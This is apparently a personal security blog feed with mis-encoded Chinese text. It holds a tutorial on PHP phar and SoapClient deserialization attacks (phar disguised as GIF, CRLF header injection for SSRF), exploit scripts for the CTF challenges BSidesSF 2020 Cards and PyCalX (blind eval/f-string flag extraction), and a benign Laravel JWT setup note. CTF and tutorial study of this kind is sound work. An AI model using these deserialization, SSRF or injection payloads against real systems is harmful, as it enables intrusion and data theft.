<h3 id="Pharå†…ç½®æ–¹æ³•"><a href="#Pharå†…ç½®æ–¹æ³•" class="headerlink" title="Pharå†…ç½®æ–¹æ³•"></a>Pharå†…ç½®æ–¹æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$phar &#x3D; new Phar(&#39;phar&#x2F;hpdoger.phar&#39;); &#x2F;&#x2F;å®ä¾‹ä¸€ä¸ªpharå¯¹è±¡ä¾›åç»­æ“ä½œ</span><br><span class="line">$phar-&gt;startBuffering()  &#x2F;&#x2F;å¼€å§‹ç¼“å†²Pharå†™æ“ä½œ</span><br><span class="line">$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo &#39;this is test file&#39;;&#39;); &#x2F;&#x2F;ä»¥å­—ç¬¦ä¸²çš„å½¢å¼æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åˆ° phar æ¡£æ¡ˆ</span><br><span class="line">$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) &#x2F;&#x2F;æŠŠä¸€ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å½’æ¡£åˆ°pharæ¡£æ¡ˆ</span><br><span class="line">$phar-&gt;extractTo()  &#x2F;&#x2F;è§£å‹ä¸€ä¸ªpharåŒ…çš„å‡½æ•°ï¼ŒextractTo æå–pharæ–‡æ¡£å†…å®¹</span><br></pre></td></tr></table></figure>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub</span><br><span class="line">    $o &#x3D; new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">    $phar-&gt;stopBuffering();&#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">&#x2F;&#x2F;åˆ›å»ºpharæ–‡ä»¶</span><br><span class="line">&lt;?php </span><br><span class="line">    class TestObject &#123;</span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">            echo &#39;Destruct called&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;test.txt&#39;;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">&#x2F;&#x2F;åˆ©ç”¨é¡µé¢</span><br><span class="line">&#x2F;&#x2F;è¾“å‡º</span><br><span class="line">Destruct called</span><br><span class="line">&#x2F;&#x2F;æ‰€ä»¥è¾¾åˆ°äº†ååºåˆ—åŒ–TestObjectå¯¹è±¡çš„ç›®çš„</span><br></pre></td></tr></table></figure>
<h3 id="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"><a href="#å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶" class="headerlink" title="å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶"></a>å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</h3><p>phpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯<code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span><br><span class="line">    $o &#x3D; new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">    &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;ç”Ÿæˆçš„pharæ–‡ä»¶ä¼šè¢«æ–‡ä»¶å¤´æ£€æµ‹ä¸ºGIF</span><br></pre></td></tr></table></figure>
<h2 id="ä½¿ç”¨phpå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»"><a href="#ä½¿ç”¨phpå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»" class="headerlink" title="ä½¿ç”¨phpå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»"></a>ä½¿ç”¨phpå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</h2><h3 id="PHPå†…ç½®ç±»"><a href="#PHPå†…ç½®ç±»" class="headerlink" title="PHPå†…ç½®ç±»"></a>PHPå†…ç½®ç±»</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$classes &#x3D; get_declared_classes();</span><br><span class="line">foreach ($classes as $class) &#123;</span><br><span class="line">	$methods &#x3D; get_class_methods($class);</span><br><span class="line">	foreach ($methods as $method) &#123;</span><br><span class="line">		if (in_array($method, array(</span><br><span class="line">			&#39;__destruct&#39;,</span><br><span class="line">			&#39;__toString&#39;,</span><br><span class="line">			&#39;__wakeup&#39;,</span><br><span class="line">			&#39;__call&#39;,</span><br><span class="line">			&#39;__callStatic&#39;,</span><br><span class="line">			&#39;__get&#39;,</span><br><span class="line">			&#39;__set&#39;,</span><br><span class="line">			&#39;__isset&#39;,</span><br><span class="line">			&#39;__unset&#39;,</span><br><span class="line">			&#39;__invoke&#39;,</span><br><span class="line">			&#39;__set_state&#39;</span><br><span class="line">		))) &#123;</span><br><span class="line">			print $class . &#39;::&#39; . $method . &quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;è¾“å‡ºç»“æœä¸ºphpä¸­å†…ç½®çš„ç±»åŠæ–¹æ³•</span><br></pre></td></tr></table></figure>
<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><h4 id="callæ–¹æ³•"><a href="#callæ–¹æ³•" class="headerlink" title="__callæ–¹æ³•"></a><code>__call</code>æ–¹æ³•</h4><p>æ­£å¸¸æƒ…å†µä¸‹çš„<code>SoapClient</code>ç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨<code>__call</code>æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;bbb&#39;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
<p>åœ¨æœåŠ¡å™¨æˆ–è€…è™šæ‹Ÿæœºå¼€å¯ncç›‘å¬ç«¯å£,å°±ä¼šæ”¶åˆ°SoapClientå¯¹è±¡çš„httpè¯·æ±‚,æºå¸¦ç€ä¸€æ®µxmlæ–‡æœ¬</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200414/0YF4dgN2wFmy.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200414/0YF4dgN2wFmy.png?imageslim" alt="mark"></a></p>
<p><code>SOAPAction</code>å¤„å¯æ§ï¼Œå¯ä»¥æŠŠ<code>\x0d\x0a</code>æ³¨å…¥åˆ°<code>SOAPAction</code>ï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200414/iNrDeQpFDpm5.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200414/iNrDeQpFDpm5.png?imageslim" alt="mark"></a></p>
<p>ä½†<code>Content-Type</code>åœ¨<code>SOAPAction</code>çš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶<code>Content-Typ</code>,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ®</p>
<p>åœ¨headeré‡Œ<code>User-Agent</code>åœ¨<code>Content-Type</code>å‰é¢</p>
<p><code>user_agent</code>åŒæ ·å¯ä»¥æ³¨å…¥<code>CRLF</code>ï¼Œæ§åˆ¶<code>Content-Type</code>çš„å€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5555&#x2F;path&#39;;</span><br><span class="line">$post_string &#x3D; &#39;data&#x3D;something&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;my_session&#39;</span><br><span class="line">    );</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line"></span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);</span><br><span class="line">echo $aaa;</span><br><span class="line"></span><br><span class="line">$c &#x3D; unserialize($aaa);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200414/86vKwz3yLHJW.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200414/86vKwz3yLHJW.png?imageslim" alt="mark"></a></p>
<p>å¦‚ä¸Šï¼Œä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLF<strong>å¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚</strong>ã€‚</p>
<p><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p>
<h4 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h4><p><a href="https://link.zhihu.com/?target=https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">n1ctf2018 easy_harder_php</a></p>
<p>[SUCTF-2019 Upload Labs 2](<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload">https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload</a> Labs 2)</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.anquanke.com/post/id/159206#h2-10">å››ä¸ªå®ä¾‹é€’è¿›phpååºåˆ—åŒ–æ¼æ´ç†è§£</a></p>
<p><a href="https://paper.seebug.org/680/">åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢</a></p>
<p><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%BA%8C">PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[BSidesSF 2020]Cards</title>
    <url>/2020/04/08/CTF_WP/%5BBSidesSF%202020%5DCards/</url>
    <content><![CDATA[<h1 id="BSidesSF-2020-Cards"><a href="#BSidesSF-2020-Cards" class="headerlink" title="[BSidesSF 2020]Cards"></a>[BSidesSF 2020]Cards</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>21ç‚¹æ¸¸æˆ,æŸ¥çœ‹rules,21ç‚¹3:2,ä¸‹æ³¨æœ€å¤š500,æ‰€ä»¥æ¯æ¬¡æœ€å¤šèµ¢750è¦èµšåˆ°100000</p>
<a id="more"></a>

<p>éšä¾¿è¯•ä¸€ä¸‹,æœ‰ä¸€ä¸ªåˆå§‹åŒ–çš„/apiè·å–åˆå§‹é‡‘é’±å’Œsecretstate</p>
<p>/api/dealä¸‹æ³¨</p>
<p>è¦è¾¾åˆ°çš„ç›®çš„,åˆ©ç”¨è·å–æ–°çš„secretstate,æ—§çš„æ²¡æœ‰å¤±æ•ˆçš„è¾¾åˆ°ä¸€ç›´èµšé’±çš„æ•ˆæœ</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">start &#x3D; &quot;http:&#x2F;&#x2F;bd6d39d5-cd91-4bb9-b2ef-e753aa13f02d.node3.buuoj.cn&#x2F;api&quot;</span><br><span class="line">deal &#x3D; start + &quot;&#x2F;deal&quot;</span><br><span class="line">#å¼€å§‹</span><br><span class="line">state &#x3D; requests.post(start).json()[&quot;SecretState&quot;]</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        #ä¸‹æ³¨</span><br><span class="line">        result &#x3D; requests.post(deal, json&#x3D;&#123;&quot;Bet&quot;: 500, &quot;SecretState&quot;: state&#125;).json()</span><br><span class="line">    except:</span><br><span class="line">        print(result)</span><br><span class="line">        continue</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    if result[&#39;GameState&#39;] &#x3D;&#x3D; &#39;Blackjack&#39;:</span><br><span class="line">        #èµ¢äº†å°±æ¢SecretState</span><br><span class="line">        state &#x3D; result[&#39;SecretState&#39;]</span><br><span class="line">        print(result[&#39;Balance&#39;])</span><br><span class="line">    if result[&#39;Balance&#39;] &gt; 100000:</span><br><span class="line">        print(result)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>PyCalX 1å’Œ2</title>
    <url>/2020/04/08/CTF_WP/PyCalX%201%E5%92%8C2/</url>
    <content><![CDATA[<h1 id="PyCalX-1å’Œ2"><a href="#PyCalX-1å’Œ2" class="headerlink" title="PyCalX 1å’Œ2"></a>PyCalX 1å’Œ2</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>é¦–å…ˆæ˜¯1,å®¡è®¡æºç ,souceå¯æ§,æ¨¡æ‹Ÿsqlæ³¨å…¥æ”¹å˜æ“ä½œ</p>
<a id="more"></a>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;44f679f2-1772-4584-b810-90c98139efc8.node3.buuoj.cn&#x2F;&#39;</span><br><span class="line">flag &#x3D; &#39;flag&#123;&#39;</span><br><span class="line">url &#x3D; url + &quot;cgi-bin&#x2F;pycalx.py&quot;</span><br><span class="line">while True:</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 1</span><br><span class="line">    mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        tmp &#x3D; flag + chr(mid)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;value1&#39;: &#39;a&#39;,</span><br><span class="line">            &#39;op&#39;: &#39;+\&#39;&#39;,</span><br><span class="line">            &#39;value2&#39;: &#39;and FLAG&gt;source#&#39;,</span><br><span class="line">            &#39;source&#39;: tmp</span><br><span class="line">        &#125;</span><br><span class="line">        data2&#x3D;&#123;</span><br><span class="line">            &#39;value1&#39;:&#39;Tru&#39;,</span><br><span class="line">            &#39;op&#39;:&#39;+f&#39;,</span><br><span class="line">            &#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;,</span><br><span class="line">            &#39;source&#39;:tmp</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.get(url, data)</span><br><span class="line">        print(chr(mid), end&#x3D;&quot;&quot;)</span><br><span class="line">        if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            if &#39;True&#39; in r.text:</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high &#x3D; mid</span><br><span class="line">            mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">        else:</span><br><span class="line">            time.sleep(1)</span><br><span class="line">    flag +&#x3D; chr(mid-1)</span><br><span class="line">    print(&quot; | flag&#x3D;&quot;+flag)</span><br><span class="line">    if &quot;&#125;&quot; in flag:</span><br><span class="line">        break</span><br><span class="line">print(&quot;flag&#x3D;&quot;+flag)</span><br></pre></td></tr></table></figure>
<h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç„¶åæ˜¯2,è¿›ä¸€æ­¥è¿‡æ»¤äº†<code>&#39;&#39;</code>æ‰€ä»¥åˆ©ç”¨python3çš„<code>F-strings</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;value1&#39;:&#39;Tru&#39;,</span><br><span class="line">&#39;op&#39;:&#39;+f&#39;,</span><br><span class="line">&#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;,</span><br><span class="line">&#39;source&#39;:&#39;flag&#123;a&#39;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨python3.6ä»¥åçš„ç‰¹æ€§<code>f&#39;&#123;ä¸­é—´å¯ä»¥åŠ è¡¨è¾¾å¼&#125;&#39;</code>,å½“sourceä¸ºFLAGä¸­å­—ç¬¦æ—¶è¾“å‡ºä¸ºTru+101:c(å°±æ˜¯å­—ç¬¦e)ç»„åˆæˆTrue,è¡¨ç¤ºç»“æœä¸ºfalseæ—¶è¾“å‡ºTruf,å†printä¼šè§¦å‘å¼‚å¸¸ç„¶åå°±ä¼šè¾“å‡ºInvalid</p>
<p>ç„¶åå°±å¯ä»¥æ”¹å˜è¡¨è¾¾å¼æ¥ç›²æ³¨,ä½†æ˜¯æœ€ç»ˆå¹¶æ²¡æœ‰å¤ç°å‡ºæ¥</p>
<p>çº¿ä¸Šæµ‹è¯•éƒ½ä¸ºInvalid</p>
<p>æœ¬åœ°æµ‹è¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG &#x3D; &quot;flag&#123;test&#125;&quot;</span><br><span class="line">source &#x3D; &quot;fla&quot;</span><br><span class="line">try:</span><br><span class="line">    result &#x3D; str(eval(&#39;Tru&#39;+f&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;))</span><br><span class="line">    if result.isdigit() or result &#x3D;&#x3D; &#39;True&#39; or result &#x3D;&#x3D; &#39;False&#39;:</span><br><span class="line">        print(result)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Invalid&quot;)  # Sorry we don&#39;t support output as a string due to security issue.</span><br><span class="line">        print(1)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Invalid&quot;)</span><br><span class="line">    print(2)</span><br><span class="line">#è¾“å‡ºç»“æœä¸º&#96;True&#96;</span><br><span class="line">#å½“source&#x3D;&quot;flb&quot;æ—¶è¾“å‡ºä¸º</span><br><span class="line">#Invalid</span><br><span class="line">#2</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravelä½¿ç”¨JWT</title>
    <url>/2020/04/02/Note/laravel%E4%BD%BF%E7%94%A8jwt/</url>
    <content><![CDATA[<h1 id="Laravelä½¿ç”¨JWT"><a href="#Laravelä½¿ç”¨JWT" class="headerlink" title="Laravelä½¿ç”¨JWT"></a>Laravelä½¿ç”¨JWT</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>laravelä½¿ç”¨JWTæœ‰ä¸¤ç§æ–¹æ³•,ä¸€ä¸­æ˜¯ä½¿ç”¨å†…ç½®çš„Authç»“åˆJWTå®šä¹‰çš„ä¸­é—´ä»¶è¿›è¡Œè®¤è¯,è¿™ç§æ–¹æ³•laravelç¤¾åŒºæœ‰å¾ˆå¤šæ•™ç¨‹,è¿™é‡Œä¸å†ç»†è¯´ï¼Œè°ˆè°ˆå¦‚ä½•ä½¿ç”¨è‡ªå®šä¹‰JWTæ¥å®Œæˆç”¨æˆ·è®¤è¯</p>
<a id="more"></a>
<h2 id="JWT-oath"><a href="#JWT-oath" class="headerlink" title="JWT-oath"></a>JWT-oath</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ä½¿ç”¨composerå®‰è£…jwt-oathæ‰©å±•</span><br><span class="line">#å½“ç„¶ä¹Ÿå¯ä»¥å†™è¿›composer.jsonæ–‡ä»¶ä¸­</span><br><span class="line">composer require tymon&#x2F;jwt-auth</span><br></pre></td></tr></table></figure>
<h3 id="ç”ŸæˆåŠ å¯†å¯†åŒ™"><a href="#ç”ŸæˆåŠ å¯†å¯†åŒ™" class="headerlink" title="ç”ŸæˆåŠ å¯†å¯†åŒ™"></a>ç”ŸæˆåŠ å¯†å¯†åŒ™</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># è¿™æ¡å‘½ä»¤ä¼šåœ¨ .env æ–‡ä»¶ä¸‹ç”Ÿæˆä¸€ä¸ªåŠ å¯†å¯†é’¥ï¼Œå¦‚ï¼šJWT_SECRET&#x3D;foobar</span><br><span class="line">#æ³¨æ„.envæ–‡ä»¶é»˜è®¤æ˜¯ä¸ä¼šä¸Šä¼ gitçš„,ä¸ºäº†ä½ çš„åŒä¼´ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨è®¤è¯,éœ€è¦åœ¨.env.exampleä¸­æ‰‹åŠ¨æ·»åŠ ç›¸åŒçš„å­—æ®µ</span><br><span class="line">php artisan jwt:secret</span><br></pre></td></tr></table></figure>
<h4 id="æ³¨å†Œä¸¤ä¸ª-Facade"><a href="#æ³¨å†Œä¸¤ä¸ª-Facade" class="headerlink" title="æ³¨å†Œä¸¤ä¸ª Facade"></a>æ³¨å†Œä¸¤ä¸ª Facade</h4><p>è¿™ä¸¤ä¸ª Facade å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯ä½¿ç”¨å®ƒä»¬ä¼šç»™ä½ çš„ä»£ç ç¼–å†™å¸¦æ¥ä¸€ç‚¹ä¾¿åˆ©ã€‚</p>
<p><strong>config/app.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;aliases&#39; &#x3D;&gt; [</span><br><span class="line">        ...</span><br><span class="line">        &#x2F;&#x2F; æ·»åŠ ä»¥ä¸‹ä¸¤è¡Œ</span><br><span class="line">        &#39;JWTAuth&#39; &#x3D;&gt; &#39;Tymon\JWTAuth\Facades\JWTAuth&#39;,</span><br><span class="line">        &#39;JWTFactory&#39; &#x3D;&gt; &#39;Tymon\JWTAuth\Facades\JWTFactory&#39;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
<h4 id="ä¿®æ”¹-auth-php"><a href="#ä¿®æ”¹-auth-php" class="headerlink" title="ä¿®æ”¹ auth.php"></a>ä¿®æ”¹ auth.php</h4><p><strong>config/auth.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;guards&#39; &#x3D;&gt; [</span><br><span class="line">    &#39;web&#39; &#x3D;&gt; [</span><br><span class="line">        &#39;driver&#39; &#x3D;&gt; &#39;session&#39;,</span><br><span class="line">        &#39;provider&#39; &#x3D;&gt; &#39;users&#39;,</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    &#39;api&#39; &#x3D;&gt; [</span><br><span class="line">        &#39;driver&#39; &#x3D;&gt; &#39;jwt&#39;,      &#x2F;&#x2F; åŸæ¥æ˜¯ token æ”¹æˆjwt</span><br><span class="line">        &#39;provider&#39; &#x3D;&gt; &#39;users&#39;,</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
<h3 id="å¤„ç†æµç¨‹"><a href="#å¤„ç†æµç¨‹" class="headerlink" title="å¤„ç†æµç¨‹"></a>å¤„ç†æµç¨‹</h3><p><a href="https://blogjpg.yanmy.top/blog/20200402/xwyk8GUazxXF.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200402/xwyk8GUazxXF.png?imageslim" alt="mark"></a></p>
<h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><h4 id="ç”Ÿæˆ"><a href="#ç”Ÿæˆ" class="headerlink" title="ç”Ÿæˆ"></a>ç”Ÿæˆ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;è‡ªå®šä¹‰çš„è½½è·å¡«å……</span><br><span class="line">$customClaims &#x3D; [</span><br><span class="line">            &#39;iss&#39; &#x3D;&gt; &quot;http:&#x2F;&#x2F;market.sky31.com&quot;,</span><br><span class="line">            &#39;share&#39; &#x3D;&gt; md5($stu_id),</span><br><span class="line">        ];</span><br><span class="line">&#x2F;&#x2F;åˆ©ç”¨JWTå·¥å‚ç±»ç”Ÿæˆæ ¹æ®è‡ªå®šä¹‰çš„è½½è·ç”Ÿæˆpayload</span><br><span class="line">$payload &#x3D; \JWTFactory::customClaims($customClaims)-&gt;make();</span><br><span class="line">&#x2F;&#x2F;è°ƒç”¨Authç±»çš„encodeæ–¹æ³•å°±å¯ä»¥ç”Ÿæˆtoken</span><br><span class="line">$token &#x3D; \JWTAuth::encode($payload);</span><br><span class="line">&#x2F;&#x2F;æ³¨æ„,æ­¤å¤„çš„tokenæ˜¯ä¸€ä¸ªç±»,å¦‚ä½•ç›´æ¥æ·»åŠ è¿›response()-&gt;json()ä¸­å°†ä¼šæŠ¥é”™,æ‰€ä»¥å¼ºåˆ¶è½¬æ¢ä¸ºStringä¾¿å¯ä»¥å½“æˆå­—ç¬¦åºŠæ­£å¸¸ä½¿ç”¨äº†</span><br><span class="line">return (string)$token;</span><br></pre></td></tr></table></figure>
